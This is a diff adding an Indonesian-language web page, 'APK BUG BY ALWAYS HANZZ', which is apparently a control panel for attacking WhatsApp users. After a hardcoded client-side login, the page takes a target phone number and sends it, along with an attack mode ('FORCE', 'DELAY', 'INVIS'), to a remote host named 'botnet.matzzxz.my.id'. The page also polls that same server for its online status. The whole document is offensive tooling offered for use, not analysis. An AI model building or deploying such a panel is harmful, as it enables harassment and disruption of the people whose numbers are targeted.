@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>APK BUG BY ALWAYS HANZZ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
+    * { box-sizing: border-box; }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: url('https://files.catbox.moe/mp9vqc.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 42px;
+      text-shadow: 2px 2px 6px #000;
+      margin: 20px 0 30px;
+    }
+
+    .login-box, #mainContent {
+      background: rgba(0,0,0,0.7);
+      padding: 25px;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 10px #000;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      font-size: 18px;
+      border-radius: 8px;
+      border: none;
+      text-align: center;
+    }
+
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      font-weight: bold;
+      background-color: #1e90ff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      margin-top: 10px;
+      box-shadow: 2px 2px 8px #000;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #005bb5;
+      transform: scale(1.03);
+    }
+
+    #logoutBtn {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      display: none;
+      background-color: red;
+    }
+
+    .button-group {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: nowrap;
+      overflow-x: auto;
+      margin-top: 20px;
+    }
+
+    .button-group button {
+      min-width: 80px;
+      white-space: nowrap;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    #serverStatus {
+      margin-top: 20px;
+      font-size: 16px;
+    }
+
+    #welcomeText {
+      margin-top: 10px;
+      font-size: 16px;
+    }
+
+    /* SUPPORT BUTTON */
+    #supportBtn {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: #444;
+      font-size: 14px;
+      padding: 10px 15px;
+      border-radius: 10px;
+    }
+
+    #supportPanel {
+      position: fixed;
+      bottom: 70px;
+      right: 20px;
+      background-color: rgba(0, 0, 0, 0.85);
+      border-radius: 10px;
+      padding: 15px;
+      display: none;
+      text-align: left;
+      width: 250px;
+      box-shadow: 0 0 10px #000;
+    }
+
+    #supportPanel p {
+      margin: 5px 0;
+      font-size: 14px;
+    }
+
+    #supportPanel button {
+      width: 100%;
+      background-color: red;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>APK BUG BY ALWAYS HANZZ</h1>
+
+  <button id="logoutBtn" onclick="logout()">LOG OUT</button>
+
+  <div class="login-box" id="loginBox">
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">LOGIN</button>
+  </div>
+
+  <div id="mainContent" class="hidden">
+    <input type="text" id="nomor" placeholder="Masukkan Nomor Target">
+    <div class="button-group">
+      <button onclick="kirimKeBot('FORCE')">FORCE</button>
+      <button onclick="kirimKeBot('DELAY')">DELAY</button>
+      <button onclick="kirimKeBot('INVIS')">INVIS</button>
+    </div>
+
+    <!-- ✅ Status Server -->
+    <div id="serverStatus">🔄 Mengecek status server...</div>
+
+    <!-- ✅ Welcome -->
+    <div id="welcomeText"></div>
+
+    <!-- ✅ Status Kirim -->
+    <div id="status" style="margin-top: 15px;"></div>
+  </div>
+
+  <!-- ✅ SUPPORT BUTTON -->
+  <button id="supportBtn" onclick="toggleSupport()">Support</button>
+  <div id="supportPanel">
+    <p><strong>WhatsApp Owner:</strong> wa.me/628xxxxx</p>
+    <p><strong>Channel Owner:</strong> t.me/yourchannel</p>
+    <button onclick="toggleSupport()">Back</button>
+  </div>
+
+  <script>
+    let loggedInUser = '';
+
+    function login() {
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+
+      if (user === "always" && pass === "always2") {
+        loggedInUser = user;
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("mainContent").classList.remove("hidden");
+        document.getElementById("logoutBtn").style.display = "block";
+        document.getElementById("welcomeText").innerText = `👋 Selamat datang ${loggedInUser}`;
+        cekStatusServer();
+      } else {
+        alert("Login gagal! Username atau password salah.");
+      }
+    }
+
+    function logout() {
+      loggedInUser = '';
+      document.getElementById("mainContent").classList.add("hidden");
+      document.getElementById("loginBox").style.display = "block";
+      document.getElementById("logoutBtn").style.display = "none";
+    }
+
+    function kirimKeBot(mode) {
+      const nomor = document.getElementById("nomor").value;
+      const status = document.getElementById("status");
+
+      if (!nomor) {
+        alert("Masukkan nomor terlebih dahulu!");
+        return;
+      }
+
+      fetch("https://botnet.matzzxz.my.id/server/224ce003", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ nomor: nomor, mode: mode })
+      })
+      .then(res => res.text())
+      .then(res => {
+        status.innerText = "✅ Berhasil dikirim ke bot!";
+      })
+      .catch(err => {
+        status.innerText = "❌ Gagal mengirim ke bot!";
+      });
+    }
+
+    // ✅ Cek status server
+    function cekStatusServer() {
+      fetch("https://botnet.matzzxz.my.id/server/224ce003")
+        .then(() => {
+          document.getElementById("serverStatus").innerHTML = "🟢 Server Online";
+        })
+        .catch(() => {
+          document.getElementById("serverStatus").innerHTML = "🔴 Server Offline";
+        });
+    }
+
+    // ✅ Toggle support panel
+    function toggleSupport() {
+      const panel = document.getElementById("supportPanel");
+      panel.style.display = panel.style.display === "none" ? "block" : "none";
+    }
+  </script>
+
+</body>
+  </html>
